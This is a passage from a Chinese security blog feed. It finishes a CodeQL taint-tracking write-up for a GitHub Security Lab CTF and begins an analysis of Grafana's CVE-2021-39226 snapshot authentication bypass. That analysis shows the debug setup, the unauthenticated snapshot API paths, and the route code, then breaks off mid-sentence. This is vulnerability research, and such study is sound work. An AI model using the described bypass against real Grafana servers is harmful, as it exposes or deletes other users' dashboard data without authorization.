<p>但如上所述，最新版CodeQL理应直接得到查询结果才对。修改一下<a href="./#%E6%B1%A1%E7%82%B9%E8%B7%9F%E8%B8%AA">污点跟踪</a>处的查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;MyTaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(IsValid isValid <span class="operator">|</span> source.asParameter() <span class="operator">=</span> isValid.getParameter(<span class="number">0</span>)) </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess methodAccess <span class="operator">|</span> </span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>methodAccess.getArgument(<span class="number">0</span>) <span class="operator">=</span> sink.asExpr() <span class="keyword">and</span></span><br><span class="line">            methodAccess.getCallee() instanceof  BuildConstraintViolationWithTemplate <span class="keyword">and</span></span><br><span class="line">            sink.getLocation().getFile().getBaseName() <span class="operator">=</span> &quot;SchedulingConstraintSetValidator.java&quot;</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MyTaintTrackingConfig cfg, DataFlow::Node source, DataFlow::Node sink,MethodAccess methodAccess</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlow(source, sink) <span class="keyword">and</span></span><br><span class="line">    methodAccess.getArgument(<span class="number">0</span>) <span class="operator">=</span> sink.asExpr() <span class="keyword">and</span></span><br><span class="line">    methodAccess.getCallee() instanceof  BuildConstraintViolationWithTemplate <span class="keyword">and</span></span><br><span class="line">    sink.getLocation().getFile().getBaseName() <span class="operator">=</span> &quot;SchedulingConstraintSetValidator.java&quot;</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Custom constraint error message contains unsanitized user data&quot;</span><br></pre></td></tr></table></figure>

<p>如果取消上面代码<code>//methodAccess.getArgument(0) = sink.asExpr() and</code>的注释，那么在<code>isSink</code>中和最后的查询条件中，对<code>sink</code>的筛选条件是一致的，所以如果上面的查询能查出结果，那么将那一行取消注释之后，也应该能查出结果，但是实际测试取消注释后是0个结果，感觉这里可能有什么bug，已经提了<a href="https://github.com/github/codeql/issues/9177">Issue</a>。</p>
<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220516214726813.png" alt="image-20220516214726813"></p>
<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220516214817080.png" alt="image-20220516214817080"></p>
<p>为了顺着原题目的思路继续学习，这里暂时把CodeQL引擎版本换成了<a href="https://github.com/github/codeql-cli-binaries/releases/tag/v2.2.3">v2.2.3</a>，库换成了<a href="https://github.com/github/codeql/releases/tag/v1.25.0">v1.25.0</a>。</p>
<p>重新执行上方Debug的<a href="./#%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90">查询</a>，发现不会通过getters传播污点，比如 <code>container.getHardConstraints</code> 和 <code>container.getSoftConstraints</code>。</p>
<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220518222225797.png" alt="image-20220518222225797"></p>
<h3 id="添加额外的污点步骤"><a href="#添加额外的污点步骤" class="headerlink" title="添加额外的污点步骤"></a>添加额外的污点步骤</h3><p>可以通过继承类 <a href="https://github.com/github/codeql/blob/bc7163aa68017f93c25ec7423044727a5d785142/java/ql/src/semmle/code/java/dataflow/internal/TaintTrackingUtil.qll#L67">TaintTracking::AdditionalTaintStep</a>  并实现 <code>step</code> 谓词。 当受污染的数据从 <code>node1</code> 流向 <code>node2</code>.时， <code>step</code> 谓词应该成立。添加如下查询以让污点在getters传播。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class GetterTaintStep extends TaintTracking::AdditionalTaintStep &#123;</span><br><span class="line">    override predicate step(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess ma <span class="operator">|</span></span><br><span class="line">            ma.getQualifier() <span class="operator">=</span> node1.asExpr() <span class="keyword">and</span></span><br><span class="line">            ma <span class="operator">=</span> node2.asExpr() <span class="keyword">and</span></span><br><span class="line">            ma.getMethod() instanceof GetterMethod</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Expr <a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/predicate.Expr$MethodAccess$getQualifier.0.html">getQualifier()</a> : 获取此方法访问的限定表达式（如果有）。</p>
</blockquote>
<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220518225203065.png" alt="image-20220518225203065"></p>
<p>在<code>keySet</code>中断了，接着添加：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class KeySetTaintStep extends TaintTracking::AdditionalTaintStep &#123;</span><br><span class="line">    override predicate step(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess ma <span class="operator">|</span></span><br><span class="line">            ma.getQualifier() <span class="operator">=</span> node1.asExpr() <span class="keyword">and</span></span><br><span class="line">            ma <span class="operator">=</span> node2.asExpr() <span class="keyword">and</span></span><br><span class="line">            ma.getMethod().getName() <span class="operator">=</span> &quot;keySet&quot;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220518225526091.png" alt="image-20220518225526091"></p>
<p>在<code>new HashSet&lt;&gt;</code>中断了，添加：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">class HashSetStep extends TaintTracking::AdditionalTaintStep &#123;</span><br><span class="line">    override predicate step(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(ConstructorCall cc <span class="operator">|</span></span><br><span class="line">            cc.getAnArgument() <span class="operator">=</span> node1.asExpr() <span class="keyword">and</span></span><br><span class="line">            cc <span class="operator">=</span> node2.asExpr() <span class="keyword">and</span></span><br><span class="line">            cc.getConstructor().getSourceDeclaration().getName() <span class="operator">=</span> &quot;HashSet&quot;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220518230306550.png" alt="image-20220518230306550"></p>
<p>已经流到预期的sink点了</p>
<h3 id="最终查询"><a href="#最终查询" class="headerlink" title="最终查询"></a>最终查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class ConstraintValidator extends Interface&#123;</span><br><span class="line">    ConstraintValidator()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;javax.validation&quot;, &quot;ConstraintValidator&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class AbstractIsValid extends <span class="keyword">Method</span>&#123;</span><br><span class="line">    AbstractIsValid()&#123;</span><br><span class="line">        this.getDeclaringType() instanceof ConstraintValidator <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;isValid&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class IsValid extends <span class="keyword">Method</span>&#123;</span><br><span class="line">    IsValid()&#123;</span><br><span class="line">        <span class="keyword">exists</span>(AbstractIsValid abstractIsValid <span class="operator">|</span> this.overridesOrInstantiates<span class="operator">*</span>(abstractIsValid) )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ConstraintValidatorContext extends RefType &#123;</span><br><span class="line">    ConstraintValidatorContext()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;javax.validation&quot;,&quot;ConstraintValidatorContext&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class BuildConstraintViolationWithTemplate extends <span class="keyword">Method</span> &#123;</span><br><span class="line">    BuildConstraintViolationWithTemplate()&#123;</span><br><span class="line">        this.getDeclaringType().getASupertype<span class="operator">*</span>() instanceof  ConstraintValidatorContext <span class="keyword">and</span></span><br><span class="line">        this.hasName(&quot;buildConstraintViolationWithTemplate&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;MyTaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(IsValid isValid <span class="operator">|</span> source.asParameter() <span class="operator">=</span> isValid.getParameter(<span class="number">0</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess methodAccess <span class="operator">|</span> </span><br><span class="line">            methodAccess.getCallee() instanceof  BuildConstraintViolationWithTemplate <span class="keyword">and</span></span><br><span class="line">            methodAccess.getArgument(<span class="number">0</span>) <span class="operator">=</span> sink.asExpr()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetterTaintStep extends TaintTracking::AdditionalTaintStep &#123;</span><br><span class="line">    override predicate step(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess ma <span class="operator">|</span></span><br><span class="line">            ma.getQualifier() <span class="operator">=</span> node1.asExpr() <span class="keyword">and</span></span><br><span class="line">            ma <span class="operator">=</span> node2.asExpr() <span class="keyword">and</span></span><br><span class="line">            ma.getMethod() instanceof GetterMethod</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class KeySetTaintStep extends TaintTracking::AdditionalTaintStep &#123;</span><br><span class="line">    override predicate step(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess ma <span class="operator">|</span></span><br><span class="line">            ma.getQualifier() <span class="operator">=</span> node1.asExpr() <span class="keyword">and</span></span><br><span class="line">            ma <span class="operator">=</span> node2.asExpr() <span class="keyword">and</span></span><br><span class="line">            ma.getMethod().getName() <span class="operator">=</span> &quot;keySet&quot;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HashSetStep extends TaintTracking::AdditionalTaintStep &#123;</span><br><span class="line">    override predicate step(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(ConstructorCall cc <span class="operator">|</span></span><br><span class="line">            cc.getAnArgument() <span class="operator">=</span> node1.asExpr() <span class="keyword">and</span></span><br><span class="line">            cc <span class="operator">=</span> node2.asExpr() <span class="keyword">and</span></span><br><span class="line">            cc.getConstructor().getSourceDeclaration().getName() <span class="operator">=</span> &quot;HashSet&quot;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MyTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Custom constraint error message contains unsanitized user data&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220518230617304.png" alt="image-20220518230617304"></p>
<h2 id="之前问题解决"><a href="#之前问题解决" class="headerlink" title="之前问题解决"></a>之前问题解决</h2><p>之前提的<a href="https://github.com/github/codeql/issues/9177">Issue</a>有了答复。</p>
<p>而且之前的数据流其实没流向预期的地方，是有中断的。如下查询：</p>
<p>codeql-cli 及库版本：</p>
<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220521115653697.png" alt="image-20220521115653697"></p>
<p>Java代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        test(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(String source)</span>&#123;</span><br><span class="line">        Set&lt;String&gt; common = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(Arrays.asList(source));</span><br><span class="line">        System.out.println(<span class="string">&quot;&quot;</span> + common);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>test</code>方法的参数作为source，标准输出的内容作为sink的话，可以看到实际运行结果是source可以流向sink。</p>
<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220521125052495.png" alt="image-20220521125052495"></p>
<p>CodeQL查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>import DataFlow::PathGraph</span><br><span class="line">import DataFlow::PartialPathGraph</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;MyTaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(<span class="keyword">Method</span> m <span class="operator">|</span> </span><br><span class="line">            m.hasQualifiedName(&quot;&quot;, &quot;Demo&quot;, &quot;test&quot;) <span class="keyword">and</span></span><br><span class="line">            m.getAParameter() <span class="operator">=</span> source.asParameter()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess ma <span class="operator">|</span> </span><br><span class="line">            ma.getCallee().getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;PrintStream&quot;) <span class="keyword">and</span></span><br><span class="line">            sink.asExpr() <span class="operator">=</span> ma.getAnArgument()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override <span class="type">int</span> explorationLimit() &#123; <span class="keyword">result</span> <span class="operator">=</span> <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> MyTaintTrackingConfig cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasPartialFlow(source, sink, _)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Partial flow from unsanitized user data&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220521125744518.png" alt="image-20220521125744518"></p>
<p>查询结果是污点只流到了<code>common [&lt;element&gt;]</code>，<code>&quot;&quot; + common</code>对于<code>common</code>中的污点数据来说是一种隐式读取，所以并没有让污点继续传播，也就没有流到预期的sink点即<code>System.out.println</code>的参数。</p>
<p>解决方法是在字符串连接处引入这些隐式读取，即在污点跟踪配置中覆盖以下方法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    pred.asExpr() <span class="operator">=</span> succ.asExpr().(AddExpr).getAnOperand()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">override predicate allowImplicitRead(DataFlow::Node node, DataFlow::ContentSet c) &#123;</span><br><span class="line">    super.allowImplicitRead(node, c)</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    this.isAdditionalTaintStep(node, _) <span class="keyword">and</span></span><br><span class="line">    (</span><br><span class="line">        c instanceof DataFlow::ArrayContent</span><br><span class="line">        <span class="keyword">or</span></span><br><span class="line">        c instanceof DataFlow::CollectionContent</span><br><span class="line">        <span class="keyword">or</span></span><br><span class="line">        c instanceof DataFlow::MapValueContent</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>import DataFlow::PartialPathGraph</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; this <span class="operator">=</span> &quot;MyTaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(<span class="keyword">Method</span> m <span class="operator">|</span> </span><br><span class="line">            m.hasQualifiedName(&quot;&quot;, &quot;Demo&quot;, &quot;test&quot;) <span class="keyword">and</span></span><br><span class="line">            m.getAParameter() <span class="operator">=</span> source.asParameter()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        <span class="keyword">exists</span>(MethodAccess ma <span class="operator">|</span> </span><br><span class="line">            ma.getCallee().getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;PrintStream&quot;) <span class="keyword">and</span></span><br><span class="line">            sink.asExpr() <span class="operator">=</span> ma.getAnArgument()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">        pred.asExpr() <span class="operator">=</span> succ.asExpr().(AddExpr).getAnOperand()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate allowImplicitRead(DataFlow::Node node, DataFlow::ContentSet c) &#123;</span><br><span class="line">        super.allowImplicitRead(node, c)</span><br><span class="line">        <span class="keyword">or</span></span><br><span class="line">        this.isAdditionalTaintStep(node, _) <span class="keyword">and</span></span><br><span class="line">        (</span><br><span class="line">            c instanceof DataFlow::ArrayContent</span><br><span class="line">            <span class="keyword">or</span></span><br><span class="line">            c instanceof DataFlow::CollectionContent</span><br><span class="line">            <span class="keyword">or</span></span><br><span class="line">            c instanceof DataFlow::MapValueContent</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> MyTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Partial flow from unsanitized user data&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/image-20220521131153845.png" alt="image-20220521131153845"></p>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://securitylab.github.com/ctf/codeql-and-chill/">GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition</a></p>
<p><a href="https://securitylab.github.com/ctf/codeql-and-chill/answers/">Answers &amp; Feedback - GitHub Security Lab CTF 4: CodeQL and chill - The Java edition</a></p>
<p><a href="https://github.com/SummerSec/BlogPapers/blob/master/2022/GitHub%20Java%20CodeQL%20CTF.md">GitHub Java CodeQL CTF</a></p>
<p><a href="https://xz.aliyun.com/t/7979">使用 CodeQL 挖掘 CVE-2020-9297</a></p>
]]></content>
      <tags>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Grafana 历史漏洞分析</title>
    <url>/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>最近学了下Go，也准备挖一下Go WEB应用的漏洞。梳理了Grafana的结构，调试分析了Grafana的一些历史漏洞及修复方案，也在分析过程中挖到了新的。感觉Go语言确实是比较安全的，很多漏洞其实都是代码逻辑上的问题</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li><p>Grafana的Web框架<a href="https://go-macaron.com/zh-cn/starter_guide">Macaron</a></p>
</li>
<li><p>Grafana的ORM框架<a href="https://xorm.io/zh/docs/">XORM</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDM5NTY0OA==&mid=2648697189&idx=1&sn=e8dc4553defe6761599d2993b67653bc&chksm=be6e350a8919bc1cf84f5dfb123c65e77f07393f2a579b5e4a3aec1360e5a2e788722936cc1b&scene=178&cur_album_id=1572881544908701700#rd">Grafana的主体架构</a></p>
</li>
<li><p><a href="https://xumc.github.io/blog/2018/07/25/grafana-inside">grafana http部分源码解析</a></p>
</li>
</ul>
<h2 id="CVE-2021-39226（快照验证绕过）"><a href="#CVE-2021-39226（快照验证绕过）" class="headerlink" title="CVE-2021-39226（快照验证绕过）"></a>CVE-2021-39226（快照验证绕过）</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>:  &lt;&#x3D; 8.1.5</p>
<p><strong>Patched versions</strong>:  7.5.11, 8.1.6</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>下载指定版本：<a href="https://github.com/grafana/grafana/archive/refs/tags/v8.1.0.zip">https://github.com/grafana/grafana/archive/refs/tags/v8.1.0.zip</a></p>
<p>修改build.go中的编译参数用于远程调试，且需要<a href="https://juejin.cn/post/7004731872735395877#heading-2">删除-ldflags中的-w参数</a></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//args := []string&#123;&quot;build&quot;, &quot;-ldflags&quot;, ldflags()&#125;</span></span><br><span class="line">args := []<span class="type">string</span>&#123;<span class="string">&quot;build&quot;</span>, <span class="string">&quot;-ldflags&quot;</span>, ldflags(), <span class="string">&quot;-gcflags&quot;</span>, <span class="string">&quot;all=-N -l&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//b.WriteString(&quot;-w&quot;)</span></span><br></pre></td></tr></table></figure>

<p>修改packaging&#x2F;docker&#x2F;run.sh以Delve启动应用</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exec grafana-server                                         \</span></span><br><span class="line"><span class="built_in">exec</span> dlv --listen=:2345 --headless=<span class="literal">true</span> --api-version=2 --accept-multiclient <span class="built_in">exec</span> /usr/share/grafana/bin/grafana-server --<span class="built_in">continue</span> -- \</span><br></pre></td></tr></table></figure>

<p>修改Dockerfile中的<code>Final stage</code>以安装Delve</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Final stage</span></span><br><span class="line"><span class="comment">#FROM alpine:3.13</span></span><br><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.16</span>.<span class="number">1</span>-alpine3.<span class="number">13</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">export</span> GOPROXY=<span class="string">&quot;https://goproxy.cn&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    go install github.com/go-delve/delve/cmd/dlv@v1.7.3</span></span><br></pre></td></tr></table></figure>

<p>然后构建镜像并启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build . -t grafana_debug:8.1.0</span><br><span class="line">docker run --<span class="built_in">rm</span> -d -p3000:3000 -p2345:2345 grafana_debug:8.1.0</span><br></pre></td></tr></table></figure>

<p>用GoLand连接远程调试即可</p>
<blockquote>
<p>如果<code>go-builder</code>阶段构建镜像的时候有网络环境问题，可以设置一下GOPROXY</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ENV</span> GOPROXY=<span class="string">&quot;https://goproxy.cn&quot;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>登录Grafana，点击左侧<code>Create Dashboard</code>，随便添加一些panel然后保存，然后点击左上角的分享图标<code>Share dashboard or panel</code>，选择Snapshot，点击按钮<code>Local Snapshot</code>，这会生成一个快照和类似这样的分享链接：</p>
<p><a href="http://localhost:3000/dashboard/snapshot/9EI8uXd32QUJqF3dS34EeIz3fkKsRkZB">http://localhost:3000/dashboard/snapshot/9EI8uXd32QUJqF3dS34EeIz3fkKsRkZB</a></p>
<p>这个url无需身份验证就可以访问。</p>
<p>漏洞存在于如下url，即不需要知道快照的key且无需身份验证即可获取快照信息：</p>
<ul>
<li><code>/api/snapshots/:key</code></li>
<li><code>/api/snapshots-delete/:deleteKey</code> (snapshot “public_mode” configuration setting is set to true)</li>
<li><code>/dashboard/snapshot/:key</code></li>
</ul>
<p>其中<code>/dashboard/snapshot/:key</code>只是个前端页面，本质还是会调用<code>/api/snapshots/:key</code>接口获取快照数据</p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808205929971.png" alt="image-20230808205929971"></p>
<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230808210006793.png" alt="image-20230808210006793"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>路由在pkg&#x2F;api&#x2F;api.go中定义：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r.Get(<span class="string">&quot;/dashboard/snapshot/*&quot;</span>, reqNoAuth, hs.Index)</span><br><span class="line">...</span><br><span class="line">r.Get(<span class="string">&quot;/api/snapshots/:key&quot;</span>, routing.Wrap(GetDashboardSnapshot))</span><br><span class="line">r.Get(<span class="string">&quot;/api/snapshots-delete/:deleteKey&quot;</span>, reqSnapshotPublicModeOrSignedIn, routing.Wrap(DeleteDashboardSnapshotByDeleteKey))</span><br></pre></td></tr></table></figure>

<p>以上路由都是不需要身份验证的，但<code>/api/snapshots-delete/:deleteKey</code>需要SnapshotPublicMode这项配置为True，见pkg&#x2F;middleware&#x2F;auth.go:151：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SnapshotPublicModeOrSignedIn</span><span class="params">(cfg *setting.Cfg)</span></span> macaron.Handler &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *models.ReqContext)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> cfg.SnapshotPublicMode &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> !c.IsSignedIn &#123;</span><br><span class="line">			notAuthorized(c)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在Macaron中，<code>/api/snapshots/:key</code> 中的<code>:key</code>是一个<a href="https://go-macaron.com/zh-cn/middlewares/routing#zhan-wei-fu">占位符</a>，可以理解为把url路径中的一部分作为参数，这里有个有趣的特性，如下代码：</p>
